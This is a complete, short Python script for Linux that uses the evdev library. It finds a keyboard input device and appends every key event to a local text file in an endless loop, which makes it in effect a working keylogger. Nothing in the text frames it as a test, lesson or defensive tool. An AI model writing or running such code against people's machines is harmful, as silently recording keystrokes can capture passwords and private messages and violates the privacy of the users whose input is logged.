#!../.env/bin/python
#coding=utf-8

import evdev

def find_device():
    devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
    for device in devices:
        # print(device.path, device.name, device.phys)
        if device.name.lower().find("keyboard") != -1:
            return device
    return None

def logging_key():
    device = find_device()
    if device == None:
        print("Device Keyboard not found!")
        exit(1)
    log = open("log_py.txt", "a")
    while True:
        for event in device.read_loop():
            if event.type == evdev.ecodes.EV_KEY:
                log.write(str(evdev.categorize(event)) + "\n")
    log.close()

if __name__ == "__main__":
    logging_key()